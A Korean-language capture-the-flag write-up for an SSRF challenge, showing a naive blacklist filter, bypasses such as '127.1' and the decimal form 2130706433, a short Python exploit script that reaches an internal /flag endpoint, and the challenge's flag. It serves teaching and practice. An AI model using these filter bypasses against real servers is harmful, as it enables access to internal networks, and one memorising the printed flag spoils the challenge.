# SSRF Travel

# Usage
- http://{ip}:5002

# Concept
- SSRF (Server-Side Request Forgery)
- Local Network Access
- URL Filter Bypass

# Writeup
1. 문제 분석
   - 외부에서 접근 가능한 서버(5002번 포트)와 내부에서만 접근 가능한 서버(80번 포트)가 존재
   - 내부 서버의 /flag 경로에 플래그가 존재
   - 외부 서버의 /submit 엔드포인트에서 'a' 파라미터를 통해 URL 요청 가능
   - 필터링 우회가 필요함

2. 필터링 분석
```python
def filter_url(a):
   black = ['127.0.0.1', 'localhost', '0.0.0.0']
   for keyword in black:
       if keyword in a.lower():
           return False
   return True
```
   - 127.0.0.1, localhost, 0.0.0.0이 차단됨
   - 대소문자 구분 없이 필터링

3. 우회 방법들
   - IPv4 변형: 127.1, 127.0.1
   - 16진수, 10진수 변환: 2130706433
   
4. 익스플로잇
```python
import requests

target = "http://{ip}:5002"
payload = "/submit?a=http://127.1/flag"  # or other bypass methods

r = requests.get(target + payload)
print(r.text)  # GH{SSRF_L0c4l_Tr4v3l3r}
```

5. 플래그 획득
   ```
   GH{SSRF_L0c4l_Tr4v3l3r}
   ```

# 취약점 설명
SSRF(Server-Side Request Forgery)는 서버가 클라이언트의 입력값을 바탕으로 내부 네트워크에 HTTP 요청을 보낼 때 발생할 수 있는 취약점입니다. 이 문제에서는 단순한 블랙리스트 필터링만 있어 우회가 가능했고, 이를 통해 내부 서버에 접근할 수 있었습니다.